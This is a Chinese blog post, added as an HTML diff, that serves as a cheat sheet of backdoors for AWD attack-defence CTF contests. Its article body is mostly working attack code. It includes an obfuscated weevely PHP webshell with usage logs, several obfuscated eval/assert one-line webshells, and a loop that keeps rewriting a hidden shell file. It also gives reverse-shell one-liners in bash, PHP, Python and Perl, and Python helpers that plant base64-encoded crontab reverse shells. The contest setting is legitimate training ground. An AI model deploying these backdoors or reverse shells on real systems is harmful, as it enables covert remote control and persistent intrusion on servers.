@@ -1,0 +1,1283 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Ethan">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Ethan">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="一花一世界，一木一森林">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>AWD线下备忘录 · Ethan&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/ethan.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Ethan&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">AWD线下备忘录</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Ethan's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            AWD线下备忘录
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.2k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/04/02</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>AWD模式是一个非常有意思的比赛模式，其过程也是惊险刺激！今天主要对后门进行一个汇总！</p>
+<a id="more"></a>
+<p>[TOC]</p>
+<h5 id="weevely后门"><a href="#weevely后门" class="headerlink" title="weevely后门"></a>weevely后门</h5><ol>
+<li><p>优点在于混淆性高，其他选手很难通过分析代码获得weevely型后门的密钥。另外，weevely内置了一些基础的小功能，使用起来也相对方便。</p>
+</li>
+<li><p>缺点便是通过php解析执行，执行速度较慢。</p>
+</li>
+<li><p>生成weevely后门：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># moxiaoxi @ moxiaoxideMacBook-Pro in ~/Desktop/Myself/weevely3 [22:10:27] C:2</span></span><br><span class="line">$ python weevely.py generate woaizhongguo weevely.php</span><br><span class="line">Generated backdoor <span class="keyword">with</span> password <span class="string">'woaizhongguo'</span> <span class="keyword">in</span> <span class="string">'weevely.php'</span> of <span class="number">1469</span> byte size.</span><br><span class="line">   </span><br><span class="line"><span class="comment"># moxiaoxi @ moxiaoxideMacBook-Pro in ~/Desktop/Myself/weevely3 [22:10:50]</span></span><br><span class="line">$ cat weevely.php</span><br><span class="line">&lt;?php</span><br><span class="line">$u=<span class="string">'$kh="-Y6471";$kf="-Y2151-Y";f-Yunction -Yx($t,$-Yk)-Y&#123;$c=-Yst-Yrle-Yn($k);$-Yl=strlen($t);$-Yo'</span>;</span><br><span class="line">$h=<span class="string">'.$k-Yf),-Y0,3));$p=-Y"";f-Yor($z=1;-Y$z&lt;coun-Yt($-Ym[1]);-Y$z++-Y)$-Yp.=$q-Y[$m-Y[2][$z]];if-Y('</span>;</span><br><span class="line">$s=<span class="string">'-Ys-Ytrpos(-Y$p,$h)===0)&#123;$s[-Y$i]="";$-Yp=$-Yss($p-Y,3);&#125;if(a-Yrra-Yy_ke-Yy_exists($i,-Y$s))&#123;$s['</span>;</span><br><span class="line">$j=<span class="string">';&#125;&#125;re-Yturn $o-Y;-Y-Y&#125;$r=$_SERVER-Y;$rr=@$r[-Y-Y"HTTP_REFER-YER"];$-Yra=@$r-Y[-Y"HT-YTP_ACC'</span>;</span><br><span class="line">$C=<span class="string">'o-Y-Ympress(@x(-Y@b-Yase64_decode-Y(-Y-Ypreg_replace(a-Yrray("/-Y-Y_/","-Y/-/"-Y),array(-Y"/","+"),'</span>;</span><br><span class="line">$W=<span class="string">');$q=array_value-Ys-Y($q);preg_-Ymatch_all(-Y"-Y/([-Y\\w])[\\w-]+(?:-Y;q=0.(-Y-Y[\\d-Y]))?,-Y?/",'</span>;</span><br><span class="line">$G=str_replace(<span class="string">'N'</span>,<span class="string">''</span>,<span class="string">'cNNreate_NfNuncNtiNon'</span>);</span><br><span class="line">$c=<span class="string">'$ra-Y,$m);if-Y($q-Y-Y&amp;&amp;$m)&#123;@s-Yession_start();$s=&amp;$_-YSESS-YION;$ss-Y="subs-Ytr-Y";$-Ysl="-Ys'</span>;</span><br><span class="line">$e=<span class="string">'tr-Ytolowe-Yr";$i=$-Ym[1][-Y0].$m[1][-Y1]-Y;$h=$sl($ss(md5($i.-Y$kh-Y),0,-Y3));$f=$sl($s-Ys(-Ymd5($i'</span>;</span><br><span class="line">$M=<span class="string">'$i-Y].=$p;$e-Y=strpo-Ys($s-Y[$-Yi],$f);-Yif($e)&#123;$k-Y=-Y$-Ykh.$kf;ob_start-Y();@e-Yval(@gzunc'</span>;</span><br><span class="line">$f=<span class="string">'-Y4_enc-Yode(x(g-Yzcompres-Y-Ys($o)-Y,$k));p-Yrint("&lt;$k-Y&gt;$d&lt;/-Y$-Yk&gt;");@session_-Ydestro-Yy();&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line">$B=<span class="string">'$ss-Y($s[$i],-Y0,$e)))-Y,$-Yk)-Y)-Y);$o=ob_get_conten-Yts();ob-Y-Y_e-Ynd_clean();$d=ba-Yse6'</span>;</span><br><span class="line">$g=<span class="string">'=""-Y;for($i=0;$i&lt;$l;-Y)&#123;-Yfo-Yr($j=0;($j&lt;$-Yc&amp;&amp;$i&lt;-Y$l)-Y;$j-Y++,$i++)-Y&#123;$o.=$t&#123;$i-Y&#125;^$k&#123;$-Yj&#125;'</span>;</span><br><span class="line">$x=<span class="string">'-YEPT_LANGUAGE"];if-Y($-Yrr&amp;&amp;$ra)-Y&#123;$u=p-Y-Yarse_-Yurl-Y($rr-Y);parse_str-Y($u["quer-Yy"]-Y-Y,$q'</span>;</span><br><span class="line">$S=str_replace(<span class="string">'-Y'</span>,<span class="string">''</span>,$u.$g.$j.$x.$W.$c.$e.$h.$s.$M.$C.$B.$f);</span><br><span class="line">$o=$G(<span class="string">''</span>,$S);$o();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用weevely后门</p>
+<p>将其上传到指定web目录后，使用方式如下:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># moxiaoxi @ moxiaoxideMacBook-Pro in ~/Desktop/Myself/weevely3 [22:14:15]</span></span><br><span class="line">$ python weevely.py http://<span class="number">202.112</span><span class="number">.51</span><span class="number">.135</span>:<span class="number">8801</span>/Myself/weevely.php woaizhongguo</span><br><span class="line">   </span><br><span class="line">[+] weevely <span class="number">3.5</span></span><br><span class="line">   </span><br><span class="line">[+] Target:	<span class="number">202.112</span><span class="number">.51</span><span class="number">.135</span>:<span class="number">8801</span></span><br><span class="line">[+] Session:	/Users/moxiaoxi/.weevely/sessions/<span class="number">202.112</span><span class="number">.51</span><span class="number">.135</span>/weevely_0.session</span><br><span class="line">   </span><br><span class="line">[+] Browse the filesystem <span class="keyword">or</span> execute commands starts the connection</span><br><span class="line">[+] to the target. Type :help <span class="keyword">for</span> more information.</span><br><span class="line">   </span><br><span class="line">weevely&gt; ls</span><br><span class="line">antsword.php</span><br><span class="line">k.php</span><br><span class="line">reverse.php</span><br><span class="line">weevely.php</span><br><span class="line">www-data@<span class="number">9</span>b275645e178:/var/www/html/Myself $ whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@<span class="number">9</span>b275645e178:/var/www/html/Myself $</span><br></pre></td></tr></table></figure>
+<p>这样就能得到www-data的一个类shell界面。</p>
+</li>
+<li><p>load_session连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># moxiaoxi @ moxiaoxideMacBook-Pro in ~/Desktop/Myself/weevely3 [22:15:54] C:2</span><br><span class="line">$ python weevely.py session /Users/moxiaoxi/.weevely/sessions/202.112.51.135/weevely_0.session</span><br><span class="line">   </span><br><span class="line">[+] weevely 3.5</span><br><span class="line">   </span><br><span class="line">[+] Target:	202.112.51.135:8801</span><br><span class="line">[+] Session:	/Users/moxiaoxi/.weevely/sessions/202.112.51.135/weevely_0.session</span><br><span class="line">   </span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :help for more information.</span><br><span class="line">   </span><br><span class="line">weevely&gt; ls</span><br><span class="line">antsword.php</span><br><span class="line">k.php</span><br><span class="line">reverse.php</span><br><span class="line">weevely.php</span><br><span class="line">www-data@9b275645e178:/var/www/html/Myself $</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h5 id="蚁剑及菜刀型后门"><a href="#蚁剑及菜刀型后门" class="headerlink" title="蚁剑及菜刀型后门"></a>蚁剑及菜刀型后门</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$white_ip_list = array(</span><br><span class="line">    &apos;127.0.0.1&apos;,</span><br><span class="line">    &quot;::1&quot;</span><br><span class="line">);</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">if(count($white_ip_list)&gt;0) &#123;</span><br><span class="line">    if (in_array($ip, $white_ip_list)) &#123;</span><br><span class="line">        $a = $_POST[&apos;moxiaoxi&apos;];</span><br><span class="line">        if (isset($a)) &#123;</span><br><span class="line">            eval($a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo(&apos;IP:&apos;.$ip);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用以连接后，以Gui方式运维。</p>
+<h5 id="常用的特殊webshell"><a href="#常用的特殊webshell" class="headerlink" title="常用的特殊webshell"></a>常用的特殊webshell</h5><p>控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。<br>简单举例：<br>&lt;?php ($_=@$<em>GET[2]).@$</em>($_POST[1])?&gt;<br>连接方式：php?2=assert密码是1。<br>献上我常用得一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=chr(96^5);</span><br><span class="line">$b=chr(57^79);</span><br><span class="line">$c=chr(15^110);</span><br><span class="line">$d=chr(58^86);</span><br><span class="line">$e=&apos;($_REQUEST[C])&apos;;</span><br><span class="line">@assert($a.$b.$c.$d.$e);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>配置为?b=))99(rhC(tseuqeR+lave</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sF=<span class="string">"PCT4BA6ODSE_"</span>;$s21=strtolower($sF[<span class="number">4</span>].$sF[<span class="number">5</span>].$sF[<span class="number">9</span>].$sF[<span class="number">10</span>].$sF[<span class="number">6</span>].$sF[<span class="number">3</span>].$sF[<span class="number">11</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>].$sF[<span class="number">1</span>].$sF[<span class="number">7</span>].$sF[<span class="number">8</span>].$sF[<span class="number">10</span>]);$s22=$&#123;strtoupper($sF[<span class="number">11</span>].$sF[<span class="number">0</span>].$sF[<span class="number">7</span>].$sF[<span class="number">9</span>].$sF[<span class="number">2</span>])&#125;[<span class="string">'n985de9'</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>($s22))&#123;<span class="keyword">eval</span>($s21($s22));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=<br>连接密码:0（零）</p>
+<h5 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'.conifg.php'</span>;</span><br><span class="line">$shell = <span class="string">"&lt;?php echo system("</span>curl <span class="number">10.0</span><span class="number">.0</span><span class="number">.2</span><span class="string">"); ?&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">file_put_contents($file, $shell);</span><br><span class="line">system(<span class="string">'chmod 777 .demo.php'</span>);</span><br><span class="line"></span><br><span class="line">usleep(<span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>tips:.config.php前面使用一个点，能很好的隐藏文件</p>
+<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>在bash下可以运行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>使用php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;127.0.0.1&quot;,&quot;4444&quot;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
+<p>使用python:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_REAM);s.connect((&quot;127.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+<p>使用perl：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;127.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
+<h5 id="Crontab"><a href="#Crontab" class="headerlink" title="Crontab"></a>Crontab</h5><ul>
+<li><p>查看定时任务</p>
+<p><code>cat /etc/crontab*</code> 与<code>crontab -l</code></p>
+</li>
+<li><p>crontab备份</p>
+<p><code>crontab -l &gt; $HOME/mycron</code></p>
+</li>
+<li><p>删除crontab（www-data种植，www-data清理）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -r</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>crontab执行任意命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crontab_reverse</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    crontab_path = <span class="string">"/tmp"</span></span><br><span class="line">    crontab_cmd = <span class="string">"* * * * * bash -c '%s'\n"</span>%cmd</span><br><span class="line">    encode_crontab_cmd = base64.b64encode(crontab_cmd)</span><br><span class="line">    cmd = <span class="string">"/bin/echo "</span> + encode_crontab_cmd + <span class="string">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> + crontab_path + <span class="string">"/tmp.conf"</span>+ <span class="string">" ; "</span> + <span class="string">"/usr/bin/crontab "</span> + crontab_path + <span class="string">"/tmp.conf"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>crontab反弹shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crontab_reverse</span><span class="params">(reverse_ip,reverse_port)</span>:</span></span><br><span class="line">    crontab_path = <span class="string">"/tmp"</span></span><br><span class="line">    cmd = <span class="string">'bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1'</span>%(reverse_ip , reverse_port)</span><br><span class="line">    crontab_cmd = <span class="string">"* * * * * bash -c '%s'\n"</span>%cmd</span><br><span class="line">    encode_crontab_cmd = base64.b64encode(crontab_cmd)</span><br><span class="line">    cmd = <span class="string">"/bin/echo "</span> + encode_crontab_cmd + <span class="string">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> + crontab_path + <span class="string">"/tmp.conf"</span>+ <span class="string">" ; "</span> + <span class="string">"/usr/bin/crontab "</span> + crontab_path + <span class="string">"/tmp.conf"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br></pre></td></tr></table></figure>
